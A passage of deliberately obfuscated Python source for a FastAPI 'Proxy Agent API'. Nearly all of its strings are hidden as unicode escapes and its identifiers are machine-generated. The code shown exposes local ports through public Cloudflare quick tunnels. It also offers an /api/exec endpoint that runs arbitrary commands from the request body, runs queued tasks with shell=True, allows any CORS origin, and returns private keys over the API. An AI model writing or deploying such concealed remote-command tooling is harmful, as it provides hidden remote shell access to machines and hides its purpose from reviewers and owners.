    tunnel_domain: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7684\\u672c\\u5730\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: str = Field(..., description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])

class ArgoTunnelListResponse(SResponse):
    count: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u6570\\u91cf', 'unicode_escape'), examples=[1])
    tunnels: List[ArgoTunnelInfo] = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u5217\\u8868', 'unicode_escape'), examples=[[]])

class ArgoTunnelCreateRequest(BaseModel):
    port: Optional[int] = Field(default=None, ge=1, le=65535, description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3\\u002c\\u0020\\u7f3a\\u7701\\u4f7f\\u7528\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u81ea\\u8eab\\u76d1\\u542c\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    duplicate: bool = Field(default=False, description=codecs.decode('\\u662f\\u5426\\u5141\\u8bb8\\u540c\\u4e00\\u7aef\\u53e3\\u91cd\\u590d\\u5efa\\u96a7\\u9053\\u0020\\u0028\\u9ed8\\u8ba4\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0029', 'unicode_escape'), examples=[False])

class ArgoTunnelCreateResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    created: bool = Field(..., description=codecs.decode('\\u96a7\\u9053\\u521b\\u5efa\\u7ed3\\u679c', 'unicode_escape'), examples=[True])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: Optional[str] = Field(default=None, description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')])

class ArgoTunnelDeleteRequest(BaseModel):
    port: int = Field(..., ge=1, le=65535, description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u540c\\u7aef\\u53e3\\u591a\\u96a7\\u9053\\u65f6\\u7528\\u4e8e\\u7cbe\\u786e\\u5b9a\\u4f4d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])

class ArgoTunnelDeleteResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    deleted: int = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u5220\\u9664\\u7684\\u96a7\\u9053\\u6570\\u91cf\\u0020\\u0028\\u6210\\u529f\\u65f6\\u0020\\u003e\\u003d\\u0031\\u0029', 'unicode_escape'), examples=[1])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnels: Optional[List[ArgoTunnelInfo]] = Field(default=None, description=codecs.decode('\\u5df2\\u5220\\u9664\\u96a7\\u9053\\u7684\\u660e\\u7ec6', 'unicode_escape'), examples=[[]])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

@asynccontextmanager
async def O0_fn_23(app: FastAPI):
    Logger.debug(codecs.decode('\\U0001f527\\u0020\\u521d\\u59cb\\u5316\\u7ba1\\u7406\\u5668\\u002e\\u002e\\u002e', 'unicode_escape'))
    Config.validate()
    O0_fn_1()
    app.state.file_manager = FileManager(root=Config.FILE_ROOT, max_upload=Config.MAX_UPLOAD_SIZE, chunk_size=int(os.getenv(codecs.decode('\\u0043\\u0048\\u0055\\u004e\\u004b\\u005f\\u0054\\u0048\\u0052\\u0045\\u0053\\u0048\\u004f\\u004c\\u0044', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0039\\u0037\\u0031\\u0035\\u0032\\u0030', 'unicode_escape'))), audit=Config.FILE_AUDIT_LOG)
    app.state.task_manager = TaskManager(timeout=Config.TASK_TIMEOUT, check_interval=Config.CRON_CHECK_INTERVAL)
    app.state.temp_key_manager = TempKeyManager()
    app.state.argo_tunnel_manager = ArgoTunnelManager()
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\u2705\\u0020\\u7ba1\\u7406\\u5668\\u5df2\\u6302\\u8f7d\\u5230\\u0020\\u0061\\u0070\\u0070\\u002e\\u0073\\u0074\\u0061\\u0074\\u0065', 'unicode_escape'))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0066\\u0069\\u006c\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.file_manager))
        Logger.debug(codecs.decode('\\u0020\\u0020\\u0020\\u2022\\u0020\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u003a\\u0020', 'unicode_escape') + str(app.state.task_manager))
    yield
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\U0001f6d1\\u0020\\u5e94\\u7528\\u5173\\u95ed\\uff0c\\u6e05\\u7406\\u8d44\\u6e90\\u002e\\u002e\\u002e', 'unicode_escape'))
    if hasattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.task_manager.stop_cron_loop()
        except:
            pass
    if hasattr(app.state, codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape')):
        try:
            app.state.argo_tunnel_manager.stop_all()
        except Exception:
            pass
app = FastAPI(title=codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u0041\\u0050\\u0049', 'unicode_escape'), description=codecs.decode('\\u5355\\u6587\\u4ef6\\u90e8\\u7f72\\u7248\\u0020\\u002d\\u0020\\u652f\\u6301\\u7b7e\\u540d\\u8ba4\\u8bc1\\u4e0e\\u54cd\\u5e94\\u52a0\\u5bc6', 'unicode_escape'), version=Config.AGENT_VERSION, docs_url=codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073', 'unicode_escape') if Config.DEBUG else None, redoc_url=None, lifespan=O0_fn_23)
from fastapi.middleware.cors import CORSMiddleware
app.add_middleware(CORSMiddleware, allow_origins=[codecs.decode('\\u002a', 'unicode_escape')], allow_methods=[codecs.decode('\\u002a', 'unicode_escape')], allow_headers=[codecs.decode('\\u002a', 'unicode_escape')], expose_headers=[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')])
app.add_middleware(AuthEncryptMiddleware)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelListResponse)
async def O0_fn_24(request: Request):
    O0_var_784 = request.app.state.argo_tunnel_manager
    O0_var_785 = O0_var_784.list_tunnels()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_785), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_785}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelCreateResponse, response_model_exclude_none=True)
async def O0_fn_25(request: Request, payload: ArgoTunnelCreateRequest=Body(...)):
    O0_var_786 = request.app.state.argo_tunnel_manager
    O0_var_787 = payload.port if payload.port is not None else Config.PORT
    try:
        return O0_var_786.create_tunnel(O0_var_787, duplicate=payload.duplicate)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_787, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f', 'unicode_escape'), response_model=ArgoTunnelDeleteResponse, response_model_exclude_none=True)
async def O0_fn_26(request: Request, payload: ArgoTunnelDeleteRequest=Body(...)):
    O0_var_788 = request.app.state.argo_tunnel_manager
    try:
        return O0_var_788.delete_tunnel(payload.port, tunnel_domain=payload.tunnel_domain)
    except ArgoTunnelError as exc:
        return JSONResponse(status_code=exc.status_code, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): payload.port, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): exc.message})

async def O0_fn_27(request: Request) -> ExecRequestJSON:
    O0_var_789 = await request.body()
    O0_var_790 = O0_var_789.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')).strip()
    if not O0_var_790:
        raise HTTPException(status_code=400, detail=codecs.decode('\\u0045\\u006d\\u0070\\u0074\\u0079\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'))
    try:
        return ExecRequestJSON.model_validate_json(O0_var_790)
    except Exception:
        return ExecRequestJSON(cmd=O0_var_790)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), response_model=BaseInfoResponse)
async def O0_fn_28(request: Request):
    O0_var_791 = time.time()
    if Config._baseinfo_lock is None:
        Config._baseinfo_lock = asyncio.Lock()
    async with Config._baseinfo_lock:
        if Config._baseinfo_cache is None or O0_var_791 - Config._baseinfo_cache_time > Config.BASEINFO_CACHE_TTL:
            Config._baseinfo_cache = await SystemInfoCollector().get_basic_info()
            Config._baseinfo_cache_time = O0_var_791
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u8c03\\u5ea6\\u7cfb\\u7edf\\u8d44\\u6e90\\u8fdb\\u884c\\u66f4\\u65b0\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0042\\u0061\\u0073\\u0065\\u0049\\u006e\\u0066\\u006f\\u0020\\u547d\\u4e2d\\u6709\\u6548\\u7f13\\u5b58\\uff0c\\u76f4\\u63a5\\u8f93\\u51fa\\u3002', 'unicode_escape'))
        O0_var_792 = Config._baseinfo_cache.copy()
    if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
        O0_var_792[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.SESSION_KEY
        O0_var_792[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.NOISE_KEY
    else:
        O0_var_792[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
        O0_var_792[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
    return O0_var_792

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=StatusResponse)
async def O0_fn_29(request: Request):
    O0_var_793 = time.time()
    if Config._status_lock is None:
        Config._status_lock = asyncio.Lock()
    async with Config._status_lock:
        if Config._status_cache is None or O0_var_793 - Config._status_cache_time > Config.STATUS_CACHE_TTL:
            Config._status_cache = await SystemInfoCollector().get_realtime_info()
            Config._status_cache_time = O0_var_793
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u5b9e\\u65f6\\u76d1\\u63a7\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u751f\\u6210\\u5ea6\\u91cf\\u5feb\\u7167\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u547d\\u4e2d\\u76d1\\u63a7\\u7f13\\u5b58\\u3002', 'unicode_escape'))
        O0_var_794 = Config._status_cache.copy()
    return O0_var_794

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0065\\u0078\\u0065\\u0063', 'unicode_escape'), response_model=ExecResponse)
async def O0_fn_30(payload: ExecRequestJSON=Depends(O0_fn_27)):
    O0_var_795 = payload.cmd
    O0_var_796 = payload.cwd
    O0_var_797 = payload.env
    O0_var_798 = Config.Rtimeout
    O0_var_799 = Config.EXEC_SHELL_MODE
    O0_var_800 = {codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): O0_var_799, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): subprocess.PIPE, codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): subprocess.STDOUT, codecs.decode('\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape'): subprocess.DEVNULL, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): O0_var_798, codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): True, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0077\\u0064', 'unicode_escape'): O0_var_796}
    if O0_var_797:
        O0_var_800[codecs.decode('\\u0065\\u006e\\u0076', 'unicode_escape')] = {**os.environ, **O0_var_797}
    try:
        O0_var_801 = subprocess.run(O0_var_795, **O0_var_800)
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_801.stdout, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_801.returncode, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_795}
    except subprocess.TimeoutExpired as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u000a', 'unicode_escape') + str(e.output or ''), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 124, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): True, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_795}
    except Exception as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(e)), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): -1, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_795}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0065\\u006d\\u0070\\u006b\\u0065\\u0079', 'unicode_escape'), response_model=TempKeyResponse)
async def O0_fn_31(request: Request, ttl: int=Query(Config.TEMPKEY_DEFAULT_TTL_HOURS, ge=1, le=Config.TEMPKEY_MAX_TTL_HOURS)):
    O0_var_802 = request.app.state.temp_key_manager
    O0_var_803 = O0_var_802.get_or_create(ttl)
    return TempKeyResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), key_id=O0_var_803[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')], ttl_seconds=O0_var_803[codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape')], created_at=datetime.utcfromtimestamp(O0_var_803[codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), expires_at=datetime.utcfromtimestamp(O0_var_803[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), ecdsa=TempKeyEcdsaPair(private_key=O0_var_803[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip(), public_key=O0_var_803[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip()), ecies=TempKeyEciesPair(private_key=O0_var_803[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_803[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')]))

class TaskManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4efb\\u52a1\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u7eaf\\u5185\\u5b58\\u5b58\\u50a8\\uff0c\\u52a8\\u6001\\u6267\\u884c\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u003a\\u0020\\u4e00\\u6b21\\u6027\\u6267\\u884c\\uff0c\\u6267\\u884c\\u540e\\u81ea\\u52a8\\u6e05\\u9664\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u5b9a\\u65f6\\u4efb\\u52a1\\u003a\\u0020\\u0043\\u0072\\u006f\\u006e\\u0074\\u0061\\u0062\\u0020\\u8868\\u8fbe\\u5f0f\\u8c03\\u5ea6\\uff0c\\u540e\\u53f0\\u5faa\\u73af\\u68c0\\u67e5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, timeout: int=300, check_interval: int=30, O0_var_804: int=None):
        self.timeout = timeout
        self.check_interval = check_interval
        self.max_log_size = O0_var_804 or Config.MAX_TASK_LOG_SIZE
        Config.onetimetasks_log = deque(Config.onetimetasks_log, maxlen=self.max_log_size)
        Config.crontasks_log = deque(Config.crontasks_log, maxlen=self.max_log_size)
        self._cron_task: Optional[asyncio.Task] = None
        self._running = False
        self._executed_crons: set = set()

    def set_onetime_tasks(self, O0_var_805: List[str]) -> dict:
        Config.onetasks = O0_var_805 if O0_var_805 else []
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def get_onetime_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.onetasks}

    def run_onetime_tasks(self) -> List[dict]:
        if not Config.InitTask or not Config.onetasks:
            return []
        O0_var_806 = []
        O0_var_807 = Config.onetasks.copy()
        for O0_var_808, O0_var_809 in enumerate(O0_var_807):
            O0_var_810 = datetime.utcnow()
            try:
                if Config.DEBUG:
                    Logger.debug(codecs.decode('\\U0001f680\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u002d', 'unicode_escape') + str(O0_var_808 + 1) + codecs.decode('\\u005d\\u0020\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0069\\u006e\\u0067\\u003a\\u0020', 'unicode_escape') + str(O0_var_809[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                O0_var_811 = subprocess.run(O0_var_809, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, timeout=self.timeout, text=True, errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                O0_var_812 = O0_var_811.stdout[:2000]
                O0_var_813 = O0_var_811.returncode
                O0_var_814 = self._format_log_entry(O0_var_809, O0_var_812, O0_var_813, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_814, self.max_log_size)
                O0_var_806.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_808, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_809[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_813, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_812[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
            except subprocess.TimeoutExpired as e:
                O0_var_812 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u0020', 'unicode_escape') + str(e.output[:500] if e.output else '')
                O0_var_813 = 124
                O0_var_814 = self._format_log_entry(O0_var_809, O0_var_812, O0_var_813, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_814, self.max_log_size)
                O0_var_806.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_808, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_809[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_813, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_812[:500], codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')})
            except Exception as e:
                O0_var_812 = codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_813 = -1
